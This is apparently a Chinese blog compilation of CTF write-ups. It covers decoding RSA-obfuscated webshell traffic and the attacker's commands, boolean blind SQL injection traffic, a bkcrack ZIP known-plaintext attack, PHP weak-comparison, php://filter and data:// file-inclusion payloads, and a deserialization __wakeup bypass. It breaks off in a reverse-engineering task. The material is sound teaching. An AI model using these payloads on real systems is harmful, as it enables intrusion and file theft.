directoryRkxBRyBpcyBOT1QgSEVSRSEhISEhISEhISEhCgoKUEFTU1dPUkQ6ClBhc3N3b3JkLWJhc2VkLWVuY3J5cHRpb24KaW1wb3J0IGJhc2U2NA0KDQppbXBvcnQgbGlibnVtDQpmcm9tIENyeXB0by5QdWJsaWNLZXkgaW1wb3J0IFJTQQ0KDQpwdWJrZXkgPSAiIiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLQ0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FDSy9xdjVQOGl4V2pvRkkycnpGNjJ0bTZzREZuUnNLc0doVlNDdXhRSXh1ZWhNV1FMbXY2VFB4eVRRUGVmSUt1ZnpmVUZhY2EvWUhrSVZJQzE5b2htRTVYNzM4VHR4R2JPZ2lHZWY0YnZkOXNVNk00Mms4dk1sQ1BKcDF3b0RGRE9Gb0JRcHI0WXpINFpUUjZQcytIUDhWRUlKTUc1dWlMUU9MeGRLZHhpNDFRSURBUUFCDQotLS0tLUVORCBQVUJMSUMgS0VZLS0tLS0NCiIiIg0KDQpwcmlrZXkgPSAiIiItLS0tLUJFR0lOIFBSSVZBVEUgS0VZLS0tLS0NCk1JSUNkZ0lCQURBTkJna3Foa2lHOXcwQkFRRUZBQVNDQW1Bd2dnSmNBZ0VBQW9HQkFJcitxL2sveUxGYU9nVWphdk1YcmEyYnF3TVdkR3dxd2FGVklLN0ZBakc1NkV4WkF1YS9wTS9ISk5BOTU4Z3E1L045UVZweHI5Z2VRaFVnTFgyaUdZVGxmdmZ4TzNFWnM2Q0laNS9odTkzMnhUb3pqYVR5OHlVSThtblhDZ01VTTRXZ0ZDbXZoak1maGxOSG8rejRjL3hVUWdrd2JtNkl0QTR2RjBwM0dMalZBZ01CQUFFQ2dZQkRzcWF3VDVEQVVPSFJmdDZvWisvL2pzSk1Uck9GdTQxenRyS2tiUEFVcUNlc2grNFIxV1hBalk0d252WTFXRENCTjVDTkxMSW80UlB1bGkyUjgxSFo0T3BadWlIdjgxc05NY2NhdWhySnJpb0RkYnhoeGJNNy9qUTZNOVlhandkTmlzTDV6Q2xYQ09zMS95MDErOXZEaU1EazBrWDhoaUlZbHBQS0R3anFRUUpCQUw2WTBmdW9Kbmc1N0dHaGR3dk4yYzY1NnRMRFBqOUdSaTBzZmVlTXFhdlJUTXo2L3FlYTFMZEF1ekRoUm9TMldiOEFyaE9rWW5zMEdNYXp6YzFxNDI4Q1FRQzZzTTlPaVZSNEVWL2V3R25CbkYrMHAzYWxjWXIvL0dwMXdaNmZLSXJGSlFwYkhUemYyN0FoS2dPSjFxQjZBN1AvbVFTNkp2WURQc2dyVmtQTFJuWDdBa0VBci94cGZ5WGZCNG5zVXFXRlIzZjJVaVJteDk4UmZkbEVlUGVvOVlGek5Udlgzemt1bzlHWjhlOHFLTk1KaXdiWXpUMHlmdDU5TkdlQkxRL2V5bnFVcndKQUU2Tnh5ME1xL1k1bVZWcE1SYStiYWJlTUJZOVNIZWVCazIyUXNCRmx0Nk5UMlkzVHo0Q2VvSDU0N05FRkJKRExLSUlDTzBySjZrRjZjUVNjRVJBU2JRSkFaeTA4OHNWWTZESnRHUkxQdXlzdjNOaXlmRXZpa21jekNFa0RQZXg0c2h2RkxkZHdOVWxtaHptbDVwc2NJaWU0NG1CT0owdVgzN3krY28zcTZVb1JRZz09DQotLS0tLUVORCBQUklWQVRFIEtFWS0tLS0tDQoiIiINCg0KcHVia2V5ID0gUlNBLmltcG9ydF9rZXkocHVia2V5KQ0KcHJpa2V5ID0gUlNBLmltcG9ydF9rZXkocHJpa2V5KQ0KbiA9IHB1YmtleS5uDQoNCmRlZiBlbmNfcmVwbGFjZShiYXNlNjRfc3RyOiBzdHIpOg0KICAgIGJhc2U2NF9zdHIgPSBiYXNlNjRfc3RyLnJlcGxhY2UoIi8iLCAiZTVMZ15GTTVFUVllNSF5RiY2MiVWJFVHKkIqUmZRZU0iKQ0KICAgIGJhc2U2NF9zdHIgPSBiYXNlNjRfc3RyLnJlcGxhY2UoIisiLCAibjYmQjhHNm5FQDJ0dDRVUjZoM1FCdCo1JkMmcFZ1OFciKQ0KICAgIHJldHVybiBiYXNlNjRfc3RyLnJlcGxhY2UoIj0iLCAiSlhXVUR1TFVnd1JMS0Q5ZkQ2JlZZMmFGZUUmckBGZjIiKQ0KDQpkZWYgZW5jcnlwdChwbGFpbl90ZXh0KToNCiAgICAjIOengemSpeWKoOWvhg0KICAgIGNpcGhlcl90ZXh0ID0gYiIiDQogICAgZm9yIGkgaW4gcmFuZ2UoMCwgbGVuKHBsYWluX3RleHQpLCAxMjgpOg0KICAgICAgICBwYXJ0ID0gcGxhaW5fdGV4dFtpOmkrMTI4XQ0KICAgICAgICBlbmMgPSBsaWJudW0ubjJzKHBvdyhsaWJudW0uczJuKHBhcnQpLCBwcmlrZXkuZCwgbikpDQogICAgICAgIGNpcGhlcl90ZXh0ICs9IGVuYw0KICAgIHJldHVybiBlbmNfcmVwbGFjZShiYXNlNjQuYjY0ZW5jb2RlKGNpcGhlcl90ZXh0KS5kZWNvZGUoKSkNCg0KaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoNCiAgICBtID0gYiItUlNBLSIgKiAzMA0KICAgIHByaW50KGYi5Y6f5aeL5pWw5o2uOiB7bX0iKQ0KDQogICAgYyA9IGVuY3J5cHQobSkNCiAgICBwcmludChmIuWKoOWvhuaVsOaNrjoge2N9IikNCg==flag.txthint.py小明的日记.txtGood Luck! ByeBye~ 中间存在两段Base64编码，第一段解码得出以下内容，Flag不在这，但是附带了一个密码字段Password-based-encryption： 第二段解码出来是一个RSA的Python加密脚本： 加密脚本如下： 12345678910111213141516171819202122232425262728293031323334353637import base64import libnumfrom Crypto.PublicKey import RSApubkey = &quot;&quot;&quot;-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCK/qv5P8ixWjoFI2rzF62tm6sDFnRsKsGhVSCuxQIxuehMWQLmv6TPxyTQPefIKufzfUFaca/YHkIVIC19ohmE5X738TtxGbOgiGef4bvd9sU6M42k8vMlCPJp1woDFDOFoBQpr4YzH4ZTR6Ps+HP8VEIJMG5uiLQOLxdKdxi41QIDAQAB-----END PUBLIC KEY-----&quot;&quot;&quot;prikey = &quot;&quot;&quot;-----BEGIN PRIVATE KEY-----MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAIr+q/k/yLFaOgUjavMXra2bqwMWdGwqwaFVIK7FAjG56ExZAua/pM/HJNA958gq5/N9QVpxr9geQhUgLX2iGYTlfvfxO3EZs6CIZ5/hu932xTozjaTy8yUI8mnXCgMUM4WgFCmvhjMfhlNHo+z4c/xUQgkwbm6ItA4vF0p3GLjVAgMBAAECgYBDsqawT5DAUOHRft6oZ+//jsJMTrOFu41ztrKkbPAUqCesh+4R1WXAjY4wnvY1WDCBN5CNLLIo4RPuli2R81HZ4OpZuiHv81sNMccauhrJrioDdbxhxbM7/jQ6M9YajwdNisL5zClXCOs1/y01+9vDiMDk0kX8hiIYlpPKDwjqQQJBAL6Y0fuoJng57GGhdwvN2c656tLDPj9GRi0sfeeMqavRTMz6/qea1LdAuzDhRoS2Wb8ArhOkYns0GMazzc1q428CQQC6sM9OiVR4EV/ewGnBnF+0p3alcYr//Gp1wZ6fKIrFJQpbHTzf27AhKgOJ1qB6A7P/mQS6JvYDPsgrVkPLRnX7AkEAr/xpfyXfB4nsUqWFR3f2UiRmx98RfdlEePeo9YFzNTvX3zkuo9GZ8e8qKNMJiwbYzT0yft59NGeBLQ/eynqUrwJAE6Nxy0Mq/Y5mVVpMRa+babeMBY9SHeeBk22QsBFlt6NT2Y3Tz4CeoH547NEFBJDLKIICO0rJ6kF6cQScERASbQJAZy088sVY6DJtGRLPuysv3NiyfEvikmczCEkDPex4shvFLddwNUlmhzml5pscIie44mBOJ0uX37y+co3q6UoRQg==-----END PRIVATE KEY-----&quot;&quot;&quot;pubkey = RSA.import_key(pubkey)prikey = RSA.import_key(prikey)n = pubkey.ndef enc_replace(base64_str: str): base64_str = base64_str.replace(&quot;/&quot;, &quot;e5Lg^FM5EQYe5!yF&amp;62%V$UG*B*RfQeM&quot;) base64_str = base64_str.replace(&quot;+&quot;, &quot;n6&amp;B8G6nE@2tt4UR6h3QBt*5&amp;C&amp;pVu8W&quot;) return base64_str.replace(&quot;=&quot;, &quot;JXWUDuLUgwRLKD9fD6&amp;VY2aFeE&amp;r@Ff2&quot;)def encrypt(plain_text): # 私钥加密 cipher_text = b&quot;&quot; for i in range(0, len(plain_text), 128): part = plain_text[i:i+128] enc = libnum.n2s(pow(libnum.s2n(part), prikey.d, n)) cipher_text += enc return enc_replace(base64.b64encode(cipher_text).decode())if __name__ == &#x27;__main__&#x27;: m = b&quot;-RSA-&quot; * 30 print(f&quot;原始数据: &#123;m&#125;&quot;) c = encrypt(m) print(f&quot;加密数据: &#123;c&#125;&quot;) 由以上加密脚本猜测应该要补全解密脚本，丢给GPT协助生成解密脚本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import base64from urllib import parseimport libnumfrom Crypto.PublicKey import RSAfrom FlowAnalyzer import FlowAnalyzerpubkey = &quot;&quot;&quot;-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCK/qv5P8ixWjoFI2rzF62tm6sDFnRsKsGhVSCuxQIxuehMWQLmv6TPxyTQPefIKufzfUFaca/YHkIVIC19ohmE5X738TtxGbOgiGef4bvd9sU6M42k8vMlCPJp1woDFDOFoBQpr4YzH4ZTR6Ps+HP8VEIJMG5uiLQOLxdKdxi41QIDAQAB-----END PUBLIC KEY-----&quot;&quot;&quot;prikey = &quot;&quot;&quot;-----BEGIN PRIVATE KEY-----MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAIr+q/k/yLFaOgUjavMXra2bqwMWdGwqwaFVIK7FAjG56ExZAua/pM/HJNA958gq5/N9QVpxr9geQhUgLX2iGYTlfvfxO3EZs6CIZ5/hu932xTozjaTy8yUI8mnXCgMUM4WgFCmvhjMfhlNHo+z4c/xUQgkwbm6ItA4vF0p3GLjVAgMBAAECgYBDsqawT5DAUOHRft6oZ+//jsJMTrOFu41ztrKkbPAUqCesh+4R1WXAjY4wnvY1WDCBN5CNLLIo4RPuli2R81HZ4OpZuiHv81sNMccauhrJrioDdbxhxbM7/jQ6M9YajwdNisL5zClXCOs1/y01+9vDiMDk0kX8hiIYlpPKDwjqQQJBAL6Y0fuoJng57GGhdwvN2c656tLDPj9GRi0sfeeMqavRTMz6/qea1LdAuzDhRoS2Wb8ArhOkYns0GMazzc1q428CQQC6sM9OiVR4EV/ewGnBnF+0p3alcYr//Gp1wZ6fKIrFJQpbHTzf27AhKgOJ1qB6A7P/mQS6JvYDPsgrVkPLRnX7AkEAr/xpfyXfB4nsUqWFR3f2UiRmx98RfdlEePeo9YFzNTvX3zkuo9GZ8e8qKNMJiwbYzT0yft59NGeBLQ/eynqUrwJAE6Nxy0Mq/Y5mVVpMRa+babeMBY9SHeeBk22QsBFlt6NT2Y3Tz4CeoH547NEFBJDLKIICO0rJ6kF6cQScERASbQJAZy088sVY6DJtGRLPuysv3NiyfEvikmczCEkDPex4shvFLddwNUlmhzml5pscIie44mBOJ0uX37y+co3q6UoRQg==-----END PRIVATE KEY-----&quot;&quot;&quot;pubkey = RSA.import_key(pubkey)prikey = RSA.import_key(prikey)n = pubkey.njsonPath = FlowAnalyzer.get_json_data(&quot;/tmp/webshell_pro.pcapng&quot;, display_filter=&quot;http&quot;)def dec_replace(base64_str: str): base64_str = base64_str.replace(&quot;e5Lg^FM5EQYe5!yF&amp;62%V$UG*B*RfQeM&quot;, &quot;/&quot;) base64_str = base64_str.replace(&quot;n6&amp;B8G6nE@2tt4UR6h3QBt*5&amp;C&amp;pVu8W&quot;, &quot;+&quot;) return base64_str.replace(&quot;JXWUDuLUgwRLKD9fD6&amp;VY2aFeE&amp;r@Ff2&quot;, &quot;=&quot;).encode()def decrypt(cipher_text): # 公钥解密 cipher_text = base64.b64decode(dec_replace(cipher_text)) plain_text = b&quot;&quot; for i in range(0, len(cipher_text), 128): part = cipher_text[i:i+128] dec = libnum.n2s(pow(libnum.s2n(part), pubkey.e, n)) plain_text += dec return plain_text.decode()for request, response in FlowAnalyzer(jsonPath).generate_http_dict_pairs(): if request: file_data = parse.parse_qs(request.file_data)[b&#x27;shell&#x27;][0] print(decrypt(file_data.decode())) 运行得出以下内容： 123456789101112131415┌──(kali㉿kali)-[~/桌面]└─$ python3 decode.py whoamiipconfigifconfigls /ls /rootls /root/FLAGcd /root/FLAGcat 小明的日记.txtcd /root/FLAG &amp;&amp; base64 小明的日记.txtcd /root/FLAG &amp;&amp; base64 hint.pyecho U2FsdGVkX1+SslS2BbHfe3c4/t/KxLaM6ZFlOdbtfMHnG8lepnhMnde40tNOYjSvoErLzy0csL7c5d4TlMntBQ== &gt; /root/FLAG/flag.txtls /root/FLAGecho Good Luck! ByeBye~ ​\t提取关键信息，Hacker将U2FsdGVkX1+SslS2BbHfe3c4/t/KxLaM6ZFlOdbtfMHnG8lepnhMnde40tNOYjSvoErLzy0csL7c5d4TlMntBQ==写进了&#x2F;root&#x2F;FLAG&#x2F;flag.txt文件中，这串编码看起来像Base64编码，但是尝试后不正确，结合前者的信息，应该是引入了密钥的非对称加密方法，尝试后发现为AES加密，而密钥为前面解出来的Password-based-encryption： 得到Flag：flag&#123;d0e1183c-07c3-49ea-b048-addbe6cc1b20&#125; [鹤城杯2021]流量分析下载打开附件，得到一个数据包： 使用Wireshark打开查看，简单使用协议类型排序，翻看一下可以发现这是Sql注入中布尔盲注的攻击流量： 在这回顾一下布尔盲注的知识： 布尔盲注爆出数据的原理其实是通过截取单个字符利用Ascii码来爆破字符，最后出现的Ascii码则是对应字符的Ascii码。 ​\t那根据这一性质，结合数据包中的内容，可以猜测Flag就是布尔盲注后的结果；故这有两种解法，一是根据数据包手动收集每一个字符对应的Ascii码，然后转换出来即是Flag，二则是通过脚本批量转换。 解法一：手动筛选后转换 1234a = [102,108,97,103,123,119,49,114,101,115,104,65,82,75,95,101,122,95,49,115,110,116,105,116,125,126,126]characters = [chr(i) for i in a]characters = &#x27;&#x27;.join(characters)print(characters) 即得Flag：flag&#123;w1reshARK_ez_1sntit&#125; 解法二：脚本批量筛选解析 1234567891011121314151617181920212223import re# 构建正则表达式，&#x27;\\d*&#x27;等同于&#x27;[0-9]*&#x27;。pattern = re.compile(r&quot;from%20t\\),(\\d*),1\\)\\)=(\\d*)&quot;)# 使用with来读取文件，with的好处是用完后可以自动关闭文件，减少开销。# &#x27;rb&#x27;表示用二进制只读模式读取。with open(&quot;/tmp/timu.pcapng&quot;, &quot;rb&quot;) as file: # 使用utf-8解码文件，&#x27;ignore&#x27;表示如果文件包含无法使用前者编码的字节时进行忽略，并将内容存储至data变量中。 data = file.read().decode(&quot;utf-8&quot;, &quot;ignore&quot;)# 通过正则匹配文件，形成元组。matches = pattern.findall(data)flag = [&#x27;&#x27;] * 31# 对于每个元组 t，使用 lambda 函数将其第一个元素（索引）转换为整数，并将其第二个元素（ASCII 码）转换为对应的字符。然后，通过 map() 函数对 matches 中的每个元组执行这个转换，得到一个由索引和对应字符组成的元组的迭代器。接着，使用 for 循环遍历这个迭代器中的每个元组。在循环中，index 变量存储索引值，value 变量存储对应的字符。for index, value in map(lambda t: (int(t[0]), chr(int(t[1]))), matches): flag[index] = value# 将flag拼接起来。print(&#x27;&#x27;.join(flag)) 即得Flag：flag&#123;w1reshARK_ez_1sntit&#125; 压缩包攻击BugKu-请攻击这个压缩包下载获取附件，是一个加密了的压缩包，除此之外没有任何提示： 解题思路： 暴力破解 伪加密 明文攻击 若是突破点为暴力破解，应有少量的提示，大概率不可能纯暴力破解，时间太长效率不高；可以利用010editor查看是否为伪加密： 如何判断真加密伪加密？ ​\tfrFlags 和 deFlags ​\t压缩源文件数据区中的全局方式位标记是判断压缩包有无伪加密的重要标志，即压缩源文件数据区的第7、第8两个字节09 00。 ​\tZIP的压缩源文件数据区全局方式位标记在010 Editor显示的文件结构中即为ushort frFlags。 ​\t压缩文件目录区的全局方式位标记是进行伪加密的关键，即压缩文件目录区的第9、第10两个字节。 ​\tZIP的压缩文件目录区全局方式位标记在010 Editor显示的文件结构中即为ushort deFlags。 ​\t无加密的ZIP： 压缩源文件数据区的全局方式位标记应当为00 00，且压缩源文件目录区的全局方式位标记应当为00 00 真加密的ZIP: 压缩源文件数据区的全局方式位标记应当为09 00，且压缩源文件目录区的全局方式位标记应当为09 00 伪加密的ZIP: 压缩源文件数据区的全局方式位标记应当为00 00，且压缩文件目录区的全局方式位标记应当为09 00。 可以确认是真加密，那接下来往明文攻击那方向思考，查询一下压缩包明文攻击的前置条件： 第一第二点，我们并不满足，但是第三种利用7z查看加密算法后，发现可以利用： ​利用ZipCrypto Store的特性，只需要知道加密压缩包内容的12个字节就可以对该压缩包进行明文攻击破解，标准Png文件的文件头都是一致的，所以我们可以拟造一个只有文件头的Png文件；Png文件头：89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52 12echo 89504E470D0A1A0A0000000D49484452 | xxd -r -ps &gt; png_header# xxd -r -ps：将16进制数转换成ASCII文本 ​效果是这样的： ​\t接下来使用bkcrack工具进行明文攻击，将加密的压缩包和刚刚拟造的png_header放在同一目录下： 1234567time bkcrack -C file.zip -c flag.png -p png_header -o 0 &gt; 1.log&amp;# time：加上time参数查看计算爆破时间# -C：选择加密压缩包# -c：选择压缩包的密文部分# -p：选择的明文文件# -o：指定的明文在压缩包内目标文件的偏移量# &gt; 1.log&amp;：后台运行，并将结果存入1.log 工具链接：https://github.com/kimci86/bkcrack 12# 使用以下命令查看进度 tail -f 1.log 可以获得三段密钥：92802c24 9955f8d6 65c652b8；利用这三段密钥即可把flag.png文件取出来： 1bkcrack -C file.zip -c flag.png -k 92802c24 9955f8d6 65c652b8 -d try.png 在同级目录下即可获得try.png： 打开图片即可获得Flag： 即得Flag：BugKu&#123;不是非得两个文件你才能明文攻击&#125; WEBPHP弱比较绕过SWPUCTF 2021 新生赛-easy_md5打开环境，是一段PHP代码： 12345678910111213141516171819&lt;?php highlight_file(__FILE__); include &#x27;flag2.php&#x27;; if (isset($_GET[&#x27;name&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;]))&#123; $name = $_GET[&#x27;name&#x27;]; $password = $_POST[&#x27;password&#x27;]; if ($name != $password &amp;&amp; md5($name) == md5($password))&#123; echo $flag; &#125; else &#123; echo &quot;wrong!&quot;; &#125; &#125;else &#123; echo &#x27;wrong!&#x27;;&#125;?&gt; ​代码逻辑很容易就能发现：传入参数name与参数password，name与password要求不相等但是它俩的MD5值要相等才能返回Flag。 这里涉及到一个知识点：PHP中的弱比较 在PHP中，如果两个参数的MD5值为0e开头且后部分全为数字时，在弱比较中这两个参数是视为相等的。 例子（引用自这里）： 12var_dump(&quot;0e12345&quot;==&quot;0e66666&quot;);//truevar_dump(md5(&#x27;240610708&#x27;)==md5(&#x27;QNKCDZ0&#x27;));//true 像这样特殊的MD5值还有（引用自这里和这里）： 123456789101112131415240610708:0e462097431906509019562988736854QLTHNDT:0e405967825401955372549139051580QNKCDZO:0e830400451993494058024219903391PJNPDWY:0e291529052894702774557631701704NWWKITQ:0e763082070976038347657360817689NOOPCJF:0e818888003657176127862245791911MMHUWUV:0e701732711630150438129209816536MAUXXQC:0e478478466848439040434801845361s1091221200a:0e940624217856561557816327384675s214587387a:0e848240448830537924465865611904s1502113478a:0e861580163291561247404381396064s1091221200a:0e940624217856561557816327384675s1665632922a:0e731198061491163073197128363787s1885207154a:0e509367213418206700842008763514s1836677006a:0e481036490867661113260034900752 所以我们利用这个特性，构造传入的值符合要求即可： 题目摘自NSSCTF平台，Flag为：NSSCTF&#123;cc4f9bd0-75cf-467a-a8dc-e38ae4146f48&#125; PHP伪协议SWPUCTF 2022 新生赛-ez_ez_php(revenge)题目摘自NSSCTF平台，打开题目环境，直接是代码糊脸，开始代码审计： 123456789101112131415&lt;?phperror_reporting(0);if (isset($_GET[&#x27;file&#x27;])) &#123; if ( substr($_GET[&quot;file&quot;], 0, 3) === &quot;php&quot; ) &#123; echo &quot;Nice!!!&quot;; include($_GET[&quot;file&quot;]); &#125; else &#123; echo &quot;Hacker!!&quot;; &#125;&#125;else &#123; highlight_file(__FILE__);&#125;//flag.php ​代码大致意思是接收一个参数file，比较file的前三位字符是否等于php；0代表是从索引0开始，3则代表从索引开始取三位字符；成立即回复Nice，并且包含相对应的文件，否则返回Hacker!!。 ​以php开头的，又能读文件的，那只有伪协议了，这题的考点即使伪协议，先构造最简单的payload： 1http://node5.anna.nssctf.cn:22975/?file=php://filter/resource=flag.php ​执行后显示： ​提示flag不在这，在&#x2F;flag这，那么稍微修改一下payload即可： 1http://node5.anna.nssctf.cn:22975/?file=php://filter/resource=/flag 即获取Flag：NSSCTF&#123;e2f241cd-d79f-4688-bfe8-47f0b41fd73d&#125; 伪协议的简单入门-0 php:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 php:&#x2F;&#x2F;filter 可以获取指定文件源码。当它与包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。 常见用法： php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;index.php convert.base64-encode作为过滤器存在。 利用filter协议读文件，将index.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。 SWPUCTF 2021 新生赛-PseudoProtocols题目摘自NSSCTF平台，打开题目环境，只有一行字： 可以发现url栏带了个参数，文字内容让我找hint.php，源代码和直接访问尝试了一遍，没有结果，大概率伪协议梭哈： 1http://node4.anna.nssctf.cn:28686/index.php?wllm=php://filter/resource=hint.php 嗯，没有反应，我们添加过滤器试试： 1http://node4.anna.nssctf.cn:28686/index.php?wllm=php://filter/read=convert.base64-encode/resource=hint.php 好的有反应了，由此可见，以后碰到伪协议，不管三七二十一都带上base64转码，可以规避掉一些不必要的麻烦： 解码可得： 让我们去访问这个test2222222222222.php： 依旧是代码糊脸，大概意思是接收一个参数a，并且以只读模式读取参数a，将读取到的内容与I want flag进行强比较，相等则输出success并且返回flag。此题有两个解法，一是使用伪协议中的data协议，二是使用伪协议中的input协议。 使用data:&#x2F;&#x2F;解： 123http://node4.anna.nssctf.cn:28686/test2222222222222.php/?a=data://text/plain,I want flag或者http://node4.anna.nssctf.cn:28686/test2222222222222.php/?a=data://text/plain;base64,SSB3YW50IGZsYWc= ​可以看到，在data协议中也是可以使用base64的。 使用php:&#x2F;&#x2F;input解： 用法如图所示，但是需要注意的是，HackerBar无法执行成功，MaxHackerBar可以执行成功，原因不明，故上图在火狐浏览器中复现。 即获取Flag：NSSCTF&#123;336929cf-88d3-4b87-9a41-d0f975e794c4&#125; 伪协议的简单入门-1 这题用了三个伪协议，php:&#x2F;&#x2F;filter我们已经浅浅入门了一下，接下来再了解一下data:&#x2F;&#x2F;与php:&#x2F;&#x2F;input协议。 data:&#x2F;&#x2F; 是一种数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。 常见用法： 1.data:&#x2F;&#x2F;text&#x2F;plain,[输入的内容] 2.data:&#x2F;&#x2F;text&#x2F;plain;base64,[被base64编码后的要输入的内容] php:&#x2F;&#x2F;input 可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。 遇到file_get_contents()要想到用 php:&#x2F;&#x2F;input 绕过。 当enctype&#x3D;”multipart&#x2F;form-data”的时候 php:&#x2F;&#x2F;input 是无效的。 PHP反序列化SWPUCTF 2022 新生赛-ez_ez_unserialize题目摘自NSSCTF平台，打开环境代码糊脸，开始代码审计： 12345678910111213141516171819202122232425&lt;?phpclass X&#123; public $x = __FILE__; function __construct($x) &#123; $this-&gt;x = $x; &#125; function __wakeup() &#123; if ($this-&gt;x !== __FILE__) &#123; $this-&gt;x = __FILE__; &#125; &#125; function __destruct() &#123; highlight_file($this-&gt;x); //flag is in fllllllag.php &#125;&#125;if (isset($_REQUEST[&#x27;x&#x27;])) &#123; @unserialize($_REQUEST[&#x27;x&#x27;]);&#125; else &#123; highlight_file(__FILE__);&#125; ​\t​\t​\t​\t​\t​\t​\t​\t这是一道十分标准的反序列化入门题目，考点就是如何绕过__wakeup函数，我们顺带梳理一下__wakeup函数的作用；审计一下代码，代码大意是接受一个x参数，__construct与__destruct分别是构造函数和析构函数，前者在实例化一个对象的时候，首先会去自动执行的一个方法，在序列化和反序列化过程中不会触发；后者在对象的所有引用被删除或者当对象被显示销毁时执行的魔术方法；在序列化过程中不会触发，在反序列化过程中会触发；而__wakeup函数嘛：serialize()函数会检查类中是否存在__wakeup();如果存在，则先调用__wakeup()方法，预先准备对象需要的资源；预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。简单来说，在执行unserialize()前一般会执行这个__wakeup函数。 ​\t​\t​\t​\t​\t​\t​\t​\t所以我们的突破点就在__wakeup函数里面，审计一下内容，大意是检查参数x是否等于当前文件(__FILE__为当前页面文件的意思)，要是不是当前文件，那就让它变成当前文件。后面的提示又说flag在fllllllag.php这个文件内，那显然我们需要显示的文件是fllllllag.php，前面也说到了，在执行unserialize()前一般会执行这个__wakeup函数，要是执行了__wakeup函数的话我们一辈子都看不到fllllllag.php里面是什么样了，所以这就是我们要绕过__wakeup函数的理由。 ​\t​\t​\t​\t​\t​\t​\t​\t明白了思路之后，我们就可以开始构造Payload了： 12345678910&lt;?phpclass X&#123; public $x = &#x27;fllllllag.php&#x27;;&#125;$a = new X();echo serialize($a);//运行结果：O:1:&quot;X&quot;:1:&#123;s:1:&quot;x&quot;;s:13:&quot;fllllllag.php&quot;;&#125; ​\t​\t​\t​\t​\t​\t​\t​\t这是正常反序列化的语句，要是就这么输入进去那指定是会触发__wakeup函数的，那我们就要动一些手脚来绕过它，要绕过wakeup函数，只要序列化的中的成员数大于实际成员数，即可绕过。所以最终的Payload为： 1http://node5.anna.nssctf.cn:23456/?x=O:1:&quot;X&quot;:2:&#123;s:1:&quot;x&quot;;s:13:&quot;fllllllag.php&quot;;&#125; 即获得Flag：NSSCTF&#123;fde3454e-1dc3-46ea-96d3-574fd17f6aae&#125; 反序列化的简单入门-0 反序列化的前置知识自行复习，此处主要分析魔术方法的作用。 __wakeup函数：serialize()函数会检查类中是否存在__wakeup();如果存在，则先调用__wakeup()方法，预先准备对象需要的资源；预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。 触发时机：反序列化unserialize之前。 __construct函数：构造函数，在实例化一个对象的时候，首先会去自动执行的一个方法；在序列化和反序列化过程中不会触发。 触发时机：实例化对象。 功能：提前清理不必要内容。 参数：非必要。 返回值：无。 __destruct函数：析构函数，在对象的所有引用被删除或者当对象被显示销毁时执行的魔术方法；在序列化过程中不会触发，在反序列化过程中会触发。 反序列化的动作本身是不会触发__destruct()的，会触发第二次的原因是反序列化生成的对象在最后释放时触发了__destruct()。 触发时机：对象引用完成,反序列化之后。 功能：非必要。 参数：无。 返回值：无。 ​\t​\t​\t​\t​\t​\t​\t​\t我们结合题目和Payload来理解一下这道题目，Payload中的$a为一个实例化对象，随后经过serialize()函数进行序列化；随后进行传参，那么对端在读取到的时候首先是执行__wakeup函数，随后执行__destruct函数；而当我动了手脚之后，就只执行__destruct函数了，这样我们就绕过了__wakeup函数。 ​\t​\t​\t​\t​\t​\t​\t​\t以下是本地环境演示：这是正常反序列化的情况，输出了2和3，也就是执行了__wakeup函数和__destruct函数。 而当我们动了手脚之后：就只执行__destruct函数了。 HUBUCTF 2022 新生赛-checkin题目摘自NSSCTF平台，环境打开依旧代码糊脸： 12345678910111213141516&lt;?phpshow_source(__FILE__);$username = &quot;this_is_secret&quot;; $password = &quot;this_is_not_known_to_you&quot;; include(&quot;flag.php&quot;);//here I changed those two $info = isset($_GET[&#x27;info&#x27;])? $_GET[&#x27;info&#x27;]: &quot;&quot; ;$data_unserialize = unserialize($info);if ($data_unserialize[&#x27;username&#x27;]==$username&amp;&amp;$data_unserialize[&#x27;password&#x27;]==$password)&#123; echo $flag;&#125;else&#123; echo &quot;username or password error!&quot;;&#125;?&gt;username or password error! 代码审计一下得出，要满足$data_unserialize[&#39;username&#39;]==$username&amp;&amp;$data_unserialize[&#39;password&#39;]==$password这个条件才会给我们flag，但是这俩的值已经在flag.php中被替换了，我们并不知道这俩参数的值是什么；但是我们观察这个条件，使用的是‘&#x3D;&#x3D;’，并不是强比较，那么突破点大概就是这了。 在这贴上一张表： 可以看出True与True比较就是True，那么换句话说，$username与$password都定义为True即可，那思路有了，那就开始构造Payload吧： 123456&lt;?php$info = array( &#x27;username&#x27;=&gt;true, &#x27;password&#x27;=&gt;true);echo serialize($info); Payload打上，即可获取Flag：NSSCTF&#123;8f02ca36-d929-4f66-a353-30a72181f46f&#125; 本题的考点就是一个松散比较和基础的序列化构造。 ReverseSWPUCTF 2021 新生赛-re1下载附件，是一个exe可执行文件： 二话不说直接拖进IDA中分析分析，拖进去后先查找main函数，然后F5反编译看看伪代码的逻辑： 主体代码逻辑如下： 12345678910111213141516171819strcpy(Str2, &quot;&#123;34sy_r3v3rs3&#125;&quot;); // 